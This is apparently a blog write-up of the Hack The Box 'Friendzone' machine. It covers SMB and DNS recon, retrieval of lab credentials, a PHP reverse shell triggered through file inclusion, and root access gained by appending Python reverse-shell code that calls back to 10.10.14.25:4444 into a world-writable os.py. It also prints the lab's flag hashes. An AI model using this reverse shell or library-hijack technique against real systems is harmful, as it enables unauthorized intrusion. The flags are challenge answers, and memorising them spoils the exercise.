---
layout: post
title:  "HTB Friendzone Linux"
description : 
tags: 
---

# HTB Friendzone



# Recon
Nmap Scan
```ruby
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-07 11:49 EST
Nmap scan report for 10.10.10.123
Host is up (0.023s latency).
Not shown: 993 closed ports
PORT STATE SERVICE
21/tcp open ftp
22/tcp open ssh
53/tcp open domain
80/tcp open http
139/tcp open netbios-ssn
443/tcp open https
445/tcp open microsoft-ds
```

```ruby
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-07 11:53 EST
Nmap scan report for 10.10.10.123
Host is up (0.025s latency).
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| vulners:
| cpe:/a:apache:http_server:2.4.29:
|_ CVE-2019-0211 7.2 https://vulners.com/cve/CVE-2019-0211
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open ssl/http Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| vulners:
| cpe:/a:apache:http_server:2.4.29:
|_ CVE-2019-0211 7.2 https://vulners.com/cve/CVE-2019-0211
445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
SMBMAP SCAN
```ruby
smbmap -H 10.10.10.123
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.123...
[+] IP: 10.10.10.123:445 Name: 10.10.10.123
Disk Permissions
---- -----------
print$ NO ACCESS
Files NO ACCESS
general READ ONLY
Development READ, WRITE
IPC$ NO ACCESS
```
SMBMAP recursible SCAN
```ruby
smbmap -H 10.10.10.123 -R --depth 5
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.123...
[+] IP: 10.10.10.123:445 Name: 10.10.10.123 
2/3
Disk Permissions
---- -----------
print$ NO ACCESS
Files NO ACCESS
general READ ONLY
.\
dr--r--r-- 0 Wed Jan 16 15:10:51 2019 .
dr--r--r-- 0 Wed Jan 23 16:51:02 2019 ..
-r--r--r-- 57 Tue Oct 9 19:52:42 2018 creds.txt
Development READ, WRITE
.\
IPC$ NO ACCESS
```

# Privilege Escalation

We use smbclient to donwload the creds.txt file to our machine
```ruby
smbclient //10.10.10.123/general
```
We obtain a passwd "admin:WORKWORKHhallelujah@#"
We add "friendzoneportal.red" and "friendzone.red" to our host file as the lading page
suggest to another domain and our nmap hints the same on port 445.
We locate and interesting directory "https://friendzone.red/js/js/" at first I though it
was some kind of passwd but after refreshing the page we notcied that the code change..likely
the page is running php and not static html.
At this point, our most likely path is the dns domain references..lets do a zone transfer
on our target machine

```ruby
dig axfr @10.10.10.123 friendzone.red
dig axfr @10.10.10.123 friendzoneportal.red
```

We save the info to a dns.txt file and we clean the output
```ruby
cat host.txt | grep friendzone | grep IN | cut -f 1 -d "6" | uniq > dns.txt
friendzoneportal.red
admin.friendzoneportal.red
files.friendzoneportal.red
imports.friendzoneportal.red
vpn.friendzoneportal.red
friendzoneportal.red
friendzone.red
administrator1.friendzone.red
hr.friendzone.red
uploads.friendzone.red
friendzone.red
```

The only useful address were "uploads.friendzone.red" and "administrator1.friendzone.red"
We upload a reverse shell on "uploads" but we dont get to see where IF the file was uploaded.
we only get a timestamp
the "admin" portal give us a hint about how to search for image files
"image_id=a.jpg&pagename=timestamp" but not luck there
After poking for awhile I realized that can upload our shell using smbclient on the
directory "/etc/Development/
and call our shell from "image_id=a.jpg&pagename=/etc/Development/reverseshell"
We located the passwd for user friend on "/var/www/mysql_data.conf" and we SSH into it

```ruby
for development process this is the mysql creds for user friend
db_user=friend
db_pass=Agpyu12!0.213$
db_name=FZ
3/3
```
We run LinuxEnum script with **-t 1** one more time and we got our potential escalation
path
```ruby
[-] World-writable files (excluding /proc and /sys):
-rwxrw-rw- 1 nobody nogroup 5493 Nov 7 22:10 /etc/Development/reverseshell.php
-rwxrwxrwx 1 root root 25910 Jan 15 2019 /usr/lib/python2.7/os.py
```

so we modifed the **os.py** file and add
```ruby
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.25",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
```
and boom we get root!
# FLAGS
```ruby
ROOT  "b0e6c60b82cf96e9855ac1656a9e90c7"
USER  "a9ed20acecd6c5b6b52f474e15ae9a11"
```

